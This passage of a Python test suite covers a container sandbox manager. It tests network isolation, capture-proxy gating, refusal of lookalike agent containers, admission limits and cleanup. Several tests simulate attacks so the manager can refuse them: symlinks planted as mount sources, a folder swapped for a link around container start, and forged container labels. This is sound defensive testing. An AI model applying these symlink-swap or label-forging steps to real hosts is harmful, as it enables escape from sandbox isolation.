def connects_to(world, network):
    net = world.d.networks.get(network)
    return {body["Container"]: body["EndpointConfig"] for nid, body in world.d.connects if nid == net.id}


async def test_agent_and_proxy_attached_with_alias_and_low_priority(world):
    await world.mgr.ensure(ALICE, ["projA"])
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    assert eps[world.agent.id] == {"Aliases": [sc.AGENT_ALIAS], "GwPriority": sc.GUEST_GATEWAY_PRIORITY}
    assert eps[world.proxy.id] == {"GwPriority": sc.GUEST_GATEWAY_PRIORITY}
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    members = set(net.attrs["Containers"])
    assert members == {world.agent.id, world.proxy.id, world.created(ALICE)[0].id}


async def test_guest_that_forwards_is_refused(world, caplog):
    world.agent.attrs["HostConfig"]["Sysctls"] = None
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set() and world.mgr.reservation_keys() == set()
    assert "net.ipv4.ip_forward" in caplog.text


@pytest.mark.parametrize("variant", ["no_sysctls", "no_pool", "pool_elsewhere", "forwarding"])
async def test_proxy_that_may_forward_or_reach_the_pool_is_left_off(world, variant, caplog):
    if variant == "no_sysctls":
        world.proxy.attrs["HostConfig"]["Sysctls"] = None
    elif variant == "forwarding":
        world.proxy.attrs["HostConfig"]["Sysctls"] = {"net.ipv4.ip_forward": "1"}
    elif variant == "no_pool":
        world.proxy.attrs["Config"]["Env"] = ["CAPTURE_BLOCKED_IPS=172.18.0.5"]
    else:
        world.proxy.attrs["Config"]["Env"] = ["CAPTURE_BLOCKED_IPS=10.214.0.0/17"]
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    assert world.agent.id in eps and world.proxy.id not in eps
    assert "capture proxy" in caplog.text


async def test_proxy_with_a_wider_denylist_entry_is_attached(world):
    world.proxy.attrs["Config"]["Env"] = ["CAPTURE_BLOCKED_IPS=10.0.0.0/8"]
    await world.mgr.ensure(ALICE, [])
    assert world.proxy.id in connects_to(world, sc.network_name(ALICE, "own"))


@pytest.mark.parametrize("variant", [
    "older_image", "image_tag_missing", "no_command", "no_rawtcp_setting", "rawtcp_on",
    "rawtcp_on_after_off", "rawtcp_flag", "not_mitmdump", "entrypoint_override"])
async def test_proxy_not_as_the_orchestrator_starts_it_is_left_off(world, variant, caplog):
    """The proxy's egress guard is only what its image and command make it: an
    older image (one without the guard on the real target) or raw TCP relaying
    (a stream after CONNECT passed unchecked to any address) is never a guest."""
    cmd = list(PROXY_CMD)
    if variant == "older_image":
        world.d.images.add(FakeImage("sha256:" + "e" * 64, labels={}), tag=PROXY_IMAGE)
    elif variant == "image_tag_missing":
        del world.d.images.by_name[PROXY_IMAGE]
    elif variant == "no_command":
        cmd = None
    elif variant == "no_rawtcp_setting":
        cmd = [t for t in cmd if t != "rawtcp=false"]
        cmd.remove("--set")
    elif variant == "rawtcp_on":
        cmd[cmd.index("rawtcp=false")] = "rawtcp=true"
    elif variant == "rawtcp_on_after_off":
        cmd += ["--set", "rawtcp=true"]
    elif variant == "rawtcp_flag":
        cmd += ["--rawtcp"]
    elif variant == "not_mitmdump":
        cmd[0] = "mitmweb"
    else:
        world.proxy.attrs["Config"]["Entrypoint"] = ["sh", "-c"]
    world.proxy.attrs["Config"]["Cmd"] = cmd
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    assert world.agent.id in eps and world.proxy.id not in eps
    assert "capture proxy" in caplog.text
    # Said once per proxy container, not at every check.
    await world.mgr.idle_tick()
    assert caplog.text.count("left off sandbox networks") == 1


async def test_proxy_on_the_current_image_after_a_rebuild_is_attached(world):
    # The tag moved to a rebuilt image and the orchestrator restarted the proxy on it.
    world.d.images.add(FakeImage("sha256:" + "e" * 64, labels={}), tag=PROXY_IMAGE)
    world.proxy.remove(force=True)
    world.proxy = add_proxy(world.d, image_id="sha256:" + "e" * 64)
    await world.mgr.ensure(ALICE, ["projA"])
    assert world.proxy.id in connects_to(world, sc.network_name(ALICE, "own"))


async def test_proxy_image_named_by_the_orchestrator_environment(world):
    # CAPTURE_PROXY_IMAGE moves the image the orchestrator starts the proxy from
    # (container_manager); the gate follows it.
    world.d.images.add(FakeImage("sha256:" + "f" * 64, labels={}), tag="registry.local/proxy:7")
    world.mp.setenv("CAPTURE_PROXY_IMAGE", "registry.local/proxy:7")
    await world.mgr.ensure(ALICE, ["projA"])
    assert world.proxy.id not in connects_to(world, sc.network_name(ALICE, "own"))
    world.proxy.remove(force=True)
    world.proxy = add_proxy(world.d, image_id="sha256:" + "f" * 64)
    await world.mgr.ensure(BOB, ["projB"])
    assert world.proxy.id in connects_to(world, sc.network_name(BOB, "own"))


async def test_old_engine_api_refuses_to_start(world, caplog):
    world.d.api.api_version = "1.45"
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set()
    assert "1.45" in caplog.text


async def test_recreated_agent_is_reattached_on_ensure(world):
    first = await world.mgr.ensure(ALICE, ["projA"])
    world.agent.remove(force=True)
    new_agent = add_agent(world.d)
    world.clock.now += 1
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] == first["instance"]
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    assert eps[new_agent.id] == {"Aliases": ["agent"], "GwPriority": -1000}


async def test_agent_with_broker_label_is_never_a_guest(world):
    # A scan container can forge the agent's compose labels through the broker,
    # but never drop the broker's own label.
    forged = add_agent(world.d, name="recon-forged", labels={BROKER: "1"})
    world.agent.remove(force=True)
    world.agent = None
    await world.mgr.ensure(ALICE, [])
    assert forged.id not in connects_to(world, sc.network_name(ALICE, "own"))


async def test_agent_found_by_name_when_no_compose_label(world):
    world.agent.attrs["Config"]["Labels"] = {}
    await world.mgr.ensure(ALICE, [])
    assert world.agent.id in connects_to(world, sc.network_name(ALICE, "own"))


# --- Agent discovery: the container compose made, never a copy of its image --------

# Containers that carry the agent's compose service and project labels and are
# not this stack's agent. Each forwards (no sysctls) unless it says otherwise:
# taken for the agent, one that forwards fails every start, one that does not
# is attached to every sandbox network with the alias `agent`.
NOT_THE_AGENT = {
    "docker_run": dict(labels=AGENT_IMAGE_LABELS),
    "docker_run_not_forwarding": dict(labels=AGENT_IMAGE_LABELS, sysctls=GUEST_SYSCTLS),
    "compose_run": dict(labels={**AGENT_IMAGE_LABELS, **COMPOSE_CONTAINER_LABELS, ONEOFF: "True"}),
    # What Compose v5 writes on a `docker compose run agent ...`: no number.
    "compose_run_v5": dict(labels={**AGENT_IMAGE_LABELS, CONFIG_HASH: "e" * 64, ONEOFF: "True"},
                           sysctls=GUEST_SYSCTLS),
    "broker_owned": dict(labels={**AGENT_IMAGE_LABELS, **COMPOSE_CONTAINER_LABELS, BROKER: "1"},
                         sysctls=GUEST_SYSCTLS),
    "other_project": dict(labels={**AGENT_IMAGE_LABELS, **COMPOSE_CONTAINER_LABELS,
                                  sc.COMPOSE_PROJECT_LABEL: "redamon-test"}),
    "config_hash_only": dict(labels={**AGENT_IMAGE_LABELS, CONFIG_HASH: "f" * 64}),
    "container_number_only": dict(labels={**AGENT_IMAGE_LABELS, CONTAINER_NUMBER: "2"}),
}


def add_not_the_agent(world, kind, name=None):
    spec = NOT_THE_AGENT[kind]
    return world.d.containers.add(name or f"lookalike-{kind}", labels=dict(spec["labels"]),
                                  sysctls=spec.get("sysctls"), image="redamon-agent:latest")


async def test_docker_run_of_the_agent_image_never_fails_a_start(world, caplog):
    # M-b: a unit gate's `docker run redamon-agent pytest ...` was taken for the
    # agent, lacked the sysctl, and every per-user start answered 503.
    probe = add_agent_lookalike(world.d)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    assert eps[world.agent.id] == {"Aliases": [sc.AGENT_ALIAS], "GwPriority": sc.GUEST_GATEWAY_PRIORITY}
    assert probe.id not in eps
    assert "lacks" not in caplog.text


@pytest.mark.parametrize("kind", sorted(NOT_THE_AGENT))
async def test_only_the_compose_agent_is_attached_beside_a_lookalike(world, kind, caplog):
    other = add_not_the_agent(world, kind)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    assert world.agent.id in net.attrs["Containers"] and other.id not in net.attrs["Containers"]
    assert other.id not in connects_to(world, net.name)
    assert "lacks" not in caplog.text


@pytest.mark.parametrize("kind", sorted(NOT_THE_AGENT))
async def test_a_lookalike_alone_is_no_agent_and_fails_no_start(world, kind, caplog):
    world.agent.remove(force=True)
    other = add_not_the_agent(world, kind)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    assert other.id not in world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert "no agent container" in caplog.text and "lacks" not in caplog.text


@pytest.mark.parametrize("sysctls", [None, GUEST_SYSCTLS], ids=["forwarding", "not_forwarding"])
async def test_docker_run_named_redamon_agent_is_not_taken_by_name(world, sysctls, caplog):
    # `docker run --name redamon-agent redamon-agent ...` while the real one is
    # gone: the image's compose labels do not make it compose's container.
    world.agent.remove(force=True)
    probe = add_agent_lookalike(world.d, name=sc.AGENT_CONTAINER_NAME, sysctls=sysctls)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    assert probe.id not in world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert "no agent container" in caplog.text


@pytest.mark.parametrize("labels,status", [
    ({BROKER: "1"}, "running"),
    ({**AGENT_IMAGE_LABELS, **COMPOSE_CONTAINER_LABELS, sc.COMPOSE_PROJECT_LABEL: "redamon-test"}, "running"),
    ({}, "exited"),
], ids=["broker_owned_without_compose_labels", "replica_of_another_project", "not_running"])
async def test_a_redamon_agent_by_name_that_is_not_this_stacks_is_no_agent(world, labels, status, caplog):
    world.agent.remove(force=True)
    other = world.d.containers.add(sc.AGENT_CONTAINER_NAME, labels=labels, sysctls=GUEST_SYSCTLS,
                                   status=status, image="redamon-agent:latest")
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    assert other.id not in world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert other.id not in connects_to(world, sc.network_name(ALICE, "own"))
    assert "no agent container" in caplog.text


def list_raising_without_ignore_removed(world):
    """docker-py inspects each container it lists: one removed in between (a
    broker caller can churn short-lived containers with any label) raises
    NotFound, unless the call passes ignore_removed. Returns each call's flag."""
    original = world.d.containers.list
    flags = []

    def churning(all=False, filters=None, **kw):
        flags.append(kw.get("ignore_removed"))
        if not kw.get("ignore_removed"):
            raise NotFound("No such container: removed while listed")
        return original(all=all, filters=filters)
    world.d.containers.list = churning
    return flags


async def test_containers_removed_while_listed_never_fail_the_manager(world):
    world.mp.setenv(sc.PORT_POOL_ENV, "40000-40003")
    flags = list_raising_without_ignore_removed(world)
    first = await world.mgr.ensure(ALICE, ["projA"])
    assert first["state"] == "running" and first["reverse_port"] == 40000
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] == first["instance"]
    assert await world.mgr.attach_capture_proxy_everywhere() == 1
    world.ledger.reconcile(set())
    world.mgr = world.manager()
    assert (await world.mgr.adopt())["adopted"] == 1
    assert len(flags) >= 4 and all(flags)


async def test_agent_by_name_of_a_stack_without_compose_project_needs_no_compose_label(world):
    # An orchestrator outside compose knows no project: a compose container is
    # never its agent, a container named redamon-agent with no compose label is.
    mgr = world.manager(own_compose_project=None)
    await mgr.ensure(ALICE, [])
    assert world.agent.id not in connects_to(world, sc.network_name(ALICE, "own"))
    await mgr.stop_all("operator")
    world.agent.attrs["Config"]["Labels"] = {}
    await mgr.ensure(ALICE, [])
    assert world.agent.id in connects_to(world, sc.network_name(ALICE, "own"))


async def test_every_compose_agent_replica_that_cannot_forward_is_attached(world):
    second = add_agent(world.d, name="redamon-agent-2", number=2)
    await world.mgr.ensure(ALICE, ["projA"])
    eps = connects_to(world, sc.network_name(ALICE, "own"))
    for agent in (world.agent, second):
        assert eps[agent.id] == {"Aliases": [sc.AGENT_ALIAS], "GwPriority": sc.GUEST_GATEWAY_PRIORITY}


async def test_a_replica_that_may_forward_is_left_off_and_the_others_attached(world, caplog):
    second = add_agent(world.d, name="redamon-agent-2", number=2, sysctls=None)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    members = world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert world.agent.id in members and second.id not in members
    assert "net.ipv4.ip_forward" in caplog.text


async def test_every_compose_agent_that_may_forward_still_refuses_the_start(world):
    world.agent.attrs["HostConfig"]["Sysctls"] = None
    add_agent(world.d, name="redamon-agent-2", number=2, sysctls={"net.ipv4.ip_forward": "1"})
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.d.sandbox_networks() == []


async def test_guest_check_of_live_networks_never_attaches_a_lookalike(world):
    await world.mgr.ensure(ALICE, ["projA"])
    probe = add_agent_lookalike(world.d, sysctls=GUEST_SYSCTLS)
    world.clock.now += sc.IDLE_CHECK_S + 1
    assert await world.mgr.attach_capture_proxy_everywhere() == 1
    await world.mgr.ensure(ALICE, ["projA"])
    members = world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert world.agent.id in members and probe.id not in members


async def test_adoption_never_attaches_a_lookalike(world):
    await adopt_world(world)
    probe = add_agent_lookalike(world.d, sysctls=GUEST_SYSCTLS)
    await world.mgr.adopt()
    for name in (sc.network_name(ALICE, "own"), sc.network_name(BOB, "act_as")):
        members = world.d.networks.get(name).attrs["Containers"]
        assert world.agent.id in members and probe.id not in members


@pytest.mark.parametrize("real_proxy", [True, False], ids=["beside_the_proxy", "alone"])
async def test_a_docker_run_of_the_proxy_image_is_never_a_guest(world, real_proxy):
    # The proxy is found by its container name only (compose's or the
    # orchestrator's own start): its image's compose labels never count.
    if not real_proxy:
        world.proxy.remove(force=True)
    probe = world.d.containers.add(
        "quirky_hopper", labels={sc.COMPOSE_PROJECT_LABEL: "redamon",
                                 sc.COMPOSE_SERVICE_LABEL: "capture-proxy", "redamon.capture": "proxy"},
        sysctls=GUEST_SYSCTLS, env=[f"CAPTURE_BLOCKED_IPS={sc.SUBNET_POOL}"],
        image="redamon-capture-proxy:latest")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running"
    members = world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert probe.id not in members and (world.proxy.id in members) is real_proxy


async def test_a_docker_run_of_the_kali_image_is_left_alone(world):
    # The Kali image carries compose labels only, never a sandbox, owner or
    # templates label: adoption, the port scan and starts leave such a copy be.
    world.mp.setenv(sc.PORT_POOL_ENV, "40000-40003")
    probe = world.d.containers.add("eager_lovelace", labels=dict(IMAGE_LABELS),
                                   image=sc.IMAGE, image_id=IMAGE_ID)
    assert await world.mgr.adopt() == {"adopted": 0, "removed": 0, "networks_removed": 0}
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["reverse_port"] == 40000
    assert not probe.removed and probe.status == "running"
    assert probe.id not in world.d.networks.get(sc.network_name(ALICE, "own")).attrs["Containers"]
    assert world.created(ALICE)[0].id != probe.id


async def test_network_removal_disconnects_a_connected_lab(world):
    a = await world.mgr.ensure(ALICE, [])
    name = sc.network_name(ALICE, "own")
    net = world.d.networks.get(name)
    subnet = net.attrs["IPAM"]["Config"][0]["Subnet"]
    lab = world.d.containers.add("guinea-pig-lab")
    net._attach(lab, {})
    assert await world.mgr.stop(ALICE, a["instance"], "operator") == 1
    assert world.d.sandbox_networks() == []
    assert ("network.disconnect", name, lab.id, True) in world.d.calls
    await world.mgr.ensure(BOB, [])
    bob_net = world.d.networks.get(sc.network_name(BOB, "own"))
    assert bob_net.attrs["IPAM"]["Config"][0]["Subnet"] == subnet


async def test_network_removal_failure_is_kept_for_retry(world, caplog):
    a = await world.mgr.ensure(ALICE, [])
    world.d.fail_network_remove = True
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    await world.mgr.stop(ALICE, a["instance"], "operator")
    assert sc.network_name(ALICE, "own") in world.mgr.networks_to_retry()
    assert world.ledger.sandbox_keys() == set() and world.created() == []


async def test_impostor_network_with_the_sandbox_name_is_refused(world):
    impostor = world.d.networks.add(sc.network_name(ALICE, "own"), "10.214.3.0/28",
                                    labels={sc.LABEL_SANDBOX: "1", BROKER: "1"})
    with pytest.raises(sm.SandboxStartError):
        await world.mgr.ensure(ALICE, [])
    assert world.created() == [] and world.ledger.sandbox_keys() == set()
    # Never used, and never removed either: it is not the orchestrator's.
    assert not impostor.removed and world.agent.id not in impostor.attrs["Containers"]


# --- Views, projects, folders -----------------------------------------------------

async def test_act_as_view_is_a_separate_instance(world):
    own = await world.mgr.ensure(ALICE, ["projA", "projS"])
    act = await world.mgr.ensure(ALICE, ["projA"], view=sc.VIEW_ACT_AS)
    assert own["instance"] != act["instance"] and own["host"] != act["host"]
    assert act["view"] == sc.VIEW_ACT_AS and own["token"] != act["token"]
    own_c, act_c = world.created(ALICE, "own")[0], world.created(ALICE, "act_as")[0]
    assert own_c.attrs["HostConfig"]["NetworkMode"] == sc.network_name(ALICE, "own")
    assert act_c.attrs["HostConfig"]["NetworkMode"] == sc.network_name(ALICE, "act_as")
    outs = {m["Source"] for c in (own_c, act_c) for m in c.created_kwargs["mounts"]
            if m["Target"] == sc.OUTPUT_TARGET}
    assert outs == {f"{HOST_BASES['output']}/{sc.output_rel(ALICE, v)}" for v in sc.VIEWS}
    assert os.path.isdir(world.out("users", sc.sandbox_key(ALICE, "act_as")))
    # Each list applies to its own view only.
    assert await world.mgr.reconcile(ALICE, ["projA"], ["projA"]) == 1
    assert world.created(ALICE, "act_as") and not world.created(ALICE, "own")
    await world.mgr.ensure(ALICE, ["projA"])
    assert await world.mgr.reconcile(ALICE, ["projA"], []) == 1
    assert world.created(ALICE, "own") and not world.created(ALICE, "act_as")
    await world.mgr.ensure(ALICE, [], view=sc.VIEW_ACT_AS)
    assert await world.mgr.stop_user(ALICE, "operator") == 2
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set()


async def test_stop_project_stops_every_instance_mounting_it(world):
    await world.mgr.ensure(ALICE, ["projS", "projA"])
    await world.mgr.ensure(ALICE, ["projA"], view=sc.VIEW_ACT_AS)
    await world.mgr.ensure(BOB, ["projS"])
    await world.mgr.ensure(CAROL, ["projC"])
    assert await world.mgr.stop_project("projS", "project_deleted") == 2
    left = {(c.labels[sc.LABEL_USER], c.labels[sc.LABEL_VIEW]) for c in world.created()}
    assert left == {(ALICE, "act_as"), (CAROL, "own")}
    assert len(world.ledger.sandbox_keys()) == 2
    with pytest.raises(sm.SandboxInvalid):
        await world.mgr.stop_project("../projS", "project_deleted")


async def test_created_folders_are_0777_under_umask_022(world):
    old = os.umask(0o022)
    try:
        await world.mgr.ensure(ALICE, ["projA"])
    finally:
        os.umask(old)
    for path in (world.ws("projA"), world.out("users", sc.sandbox_key(ALICE, "own"))):
        assert stat.S_IMODE(os.lstat(path).st_mode) == 0o777, path
    # Only the orchestrator adds a person's folder to users/.
    assert stat.S_IMODE(os.lstat(world.out("users")).st_mode) == 0o755


async def test_existing_project_folder_is_not_rechmodded(world):
    os.mkdir(world.ws("projA"), 0o750)
    os.chmod(world.ws("projA"), 0o750)
    await world.mgr.ensure(ALICE, ["projA"])
    assert stat.S_IMODE(os.lstat(world.ws("projA")).st_mode) == 0o750


def _plant(world, where, target):
    key = sc.sandbox_key(ALICE, "own")
    if where == "project":
        os.symlink(target, world.ws("projA"))
    elif where == "users":
        os.symlink(target, world.out("users"))
    elif where == "user_key":
        os.makedirs(world.out("users"), exist_ok=True)
        os.symlink(target, world.out("users", key))
    elif where == "project_file":
        with open(world.ws("projA"), "w") as f:
            f.write("not a folder")


@pytest.mark.parametrize("where", ["project", "users", "user_key", "project_file"])
async def test_planted_link_as_a_mount_source_is_refused(world, tmp_path, where, caplog):
    target = tmp_path / "host-root"
    target.mkdir()
    os.chmod(target, 0o700)
    _plant(world, where, str(target))
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()
    assert world.d.sandbox_networks() == []
    assert not [c for c in world.d.calls if c[0] == "containers.create"]
    # The link's target is never created into, chmodded or followed.
    assert stat.S_IMODE(os.stat(target).st_mode) == 0o700 and os.listdir(target) == []
    assert "symlink or not a folder" in caplog.text


async def test_folder_swapped_for_a_link_during_start_is_caught(world, tmp_path):
    target = tmp_path / "host-root"
    target.mkdir()

    def swap(container):
        os.rename(world.ws("projA"), str(tmp_path / "moved"))
        os.symlink(str(target), world.ws("projA"))

    world.d.on_start.append(swap)
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()


@pytest.mark.parametrize("which", ["projA", "output"])
async def test_folder_swapped_for_a_link_and_back_around_the_start_is_caught(world, tmp_path, which, caplog):
    # A shell with the workspace root (or mcp/output) mounted read-write plants a
    # link after the walk and puts the folder back once Docker has mounted it:
    # only what the started container sees tells.
    target = tmp_path / "host-root"
    target.mkdir()
    path = world.ws("projA") if which == "projA" else world.out("users", sc.sandbox_key(ALICE, "own"))
    moved = str(tmp_path / "moved")

    def plant(container):
        os.rename(path, moved)
        os.symlink(str(target), path)

    def restore(container):
        os.unlink(path)
        os.rename(moved, path)

    world.d.on_create.append(plant)
    world.d.after_start.append(restore)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()
    assert world.mgr.instances() == [] and os.path.isdir(path) and not os.path.islink(path)
    assert "is not the folder that was checked" in caplog.text


async def test_mounts_that_cannot_be_read_from_inside_refuse_the_start(world):
    world.d.fail_exec = True
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()


async def test_mounts_are_read_from_inside_before_the_instance_runs(world):
    await world.mgr.ensure(ALICE, ["projA"], custom_templates=["custom.yaml"])
    execs = [c for c in world.d.calls if c[0] == "container.exec"]
    assert len(execs) == 1
    targets = set(execs[0][2][3:])
    assert targets == {"/workspace/projA", sc.OUTPUT_TARGET, sc.SERVERS_TARGET,
                       sc.GRAPH_DB_TARGET, sc.CUSTOM_TEMPLATES_TARGET}
    # Checked before the health wait made it running.
    assert world.d.calls.index(execs[0]) < max(
        i for i, c in enumerate(world.d.calls) if c[0] == "container.reload")


async def test_need_project_drains_current_and_starts_replacement(world):
    first = await world.mgr.ensure(ALICE, ["projA"])
    second = await world.mgr.ensure(ALICE, ["projA", "projB"], need_project="projB")
    assert second["instance"] != first["instance"] and second["fresh"] is True
    states = {i.instance: i.state for i in world.mgr.instances(ALICE)}
    assert states == {first["instance"]: "draining", second["instance"]: "running"}
    assert world.mgr.reservation_keys() == {sc.reservation_key(ALICE, first["instance"]),
                                            sc.reservation_key(ALICE, second["instance"])}
    # Both instances of the view share the view's one network.
    assert len(world.d.sandbox_networks()) == 1
    # A need_project outside the list is a caller's bug.
    with pytest.raises(sm.SandboxInvalid):
        await world.mgr.ensure(ALICE, ["projA"], need_project="projZ")


# --- Admission, refusal, failures -------------------------------------------------

async def test_refusal_payload_on_ram(world):
    world.host.mem = (16 * GB, int(1.5 * GB))
    with pytest.raises(sm.SandboxRefused) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    payload = e.value.payload()
    assert payload["code"] == sc.ERR_RAM and payload["limitType"] == "ram"
    assert payload["resource"] == sc.RESOURCE and payload["admitted"] is False
    assert set(sc.LIMIT_PAYLOAD_KEYS) <= set(payload)
    assert e.value.status == 409
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set() and world.mgr.reservation_keys() == set()
    assert not os.path.exists(world.ws("projA"))


async def test_refusal_on_the_hard_count(world):
    world.mp.setenv(sc.MAX_CONCURRENT_ENV, "1")
    await world.mgr.ensure(ALICE, [])
    with pytest.raises(sm.SandboxRefused) as e:
        await world.mgr.ensure(BOB, [])
    assert e.value.payload()["code"] == sc.ERR_HARD
    assert e.value.payload()["settingName"] == sc.MAX_CONCURRENT_SETTING


async def test_start_timeout_stops_and_releases(world):
    world.d.health_on_start = "starting"
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, ["projA"])
    assert e.value.code == sc.ERR_START_TIMEOUT and e.value.status == 504
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set() and world.mgr.instances() == []


async def test_unhealthy_or_exited_start_fails(world):
    world.d.health_on_start = "unhealthy"
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, [])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()


async def test_docker_failure_cleans_up(world, caplog):
    world.d.fail_start = "driver failed programming external connectivity"
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, [])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set()


async def test_image_missing_names_the_fix(world, caplog):
    world.d.images.by_name.clear()
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    with pytest.raises(sm.SandboxStartError) as e:
        await world.mgr.ensure(ALICE, [])
    assert e.value.code == sc.ERR_IMAGE_MISSING and e.value.status == 503
    for text in (e.value.detail, caplog.text):
        assert "./redamon.sh up" in text and "docker compose --profile tools build kali-sandbox" in text
    assert world.ledger.sandbox_keys() == set() and world.d.sandbox_networks() == []


async def test_wait_false_answers_starting_then_running(world):
    gate = Gate()
    world.mgr = world.manager(sleep=gate.sleep)
    world.d.health_on_start = "starting"
    ans = await world.mgr.ensure(ALICE, ["projA"], wait=False)
    assert set(ans) == set(sc.ENSURE_STARTING_KEYS)
    assert ans["state"] == "starting" and ans["fresh"] is True
    for c in world.created():
        c.attrs["State"]["Health"]["Status"] = "healthy"
    gate.open()
    await world.mgr.join_background()
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["state"] == "running" and again["fresh"] is False
    assert again["instance"] == ans["instance"]


async def test_touch_swallows_a_refusal(world):
    world.host.mem = (16 * GB, int(1.5 * GB))
    ans = await world.mgr.ensure(ALICE, ["projA"], touch=True)
    assert ans["state"] == "unavailable" and ans["fresh"] is False
    assert world.created() == []


async def test_cancelled_caller_does_not_orphan_a_start(world):
    gate = Gate()
    world.mgr = world.manager(sleep=gate.sleep)
    world.d.health_on_start = "starting"
    task = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA"]))
    await settle(60)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    gate.open()
    await world.mgr.join_background()
    # The start the cancelled caller began finished its own way (timeout): no
    # container, network or reservation is left behind.
    assert world.created() == [] and world.ledger.sandbox_keys() == set()
    assert world.d.sandbox_networks() == [] and world.mgr.instances() == []


# --- Stop -------------------------------------------------------------------------

async def test_stop_removes_container_network_reservation(world):
    a = await world.mgr.ensure(ALICE, ["projA"])
    name = a["host"]
    assert await world.mgr.stop(ALICE, a["instance"], "operator") == 1
    assert ("container.stop", name, sc.STOP_GRACE_S) in world.d.calls
    assert ("container.remove", name, True) in world.d.calls
    assert world.created() == [] and world.d.sandbox_networks() == []
    assert world.ledger.sandbox_keys() == set() and world.mgr.reservation_keys() == set()
    assert await world.mgr.stop(ALICE, a["instance"], "operator") == 0
    # The project folder is never touched by a stop.
    assert os.path.isdir(world.ws("projA"))
    with pytest.raises(ValueError):
        await world.mgr.stop(ALICE, a["instance"], "not-a-reason")
    with pytest.raises(sm.SandboxInvalid):
        await world.mgr.stop("../x", a["instance"], "operator")
    assert await world.mgr.stop(ALICE, "../../x", "operator") == 0
    assert set(world.mgr._user_locks) == {ALICE}


async def test_failed_removal_on_access_loss_kills_and_isolates_the_container(world):
    first = await world.mgr.ensure(ALICE, ["projA", "projS"])
    container = world.created(ALICE)[0]
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    world.d.fail_remove = True
    assert await world.mgr.reconcile(ALICE, ["projA"], []) == 0
    # The lost project is out of reach at once: nothing runs and nothing can dial in.
    assert ("container.kill", container.name) in world.d.calls
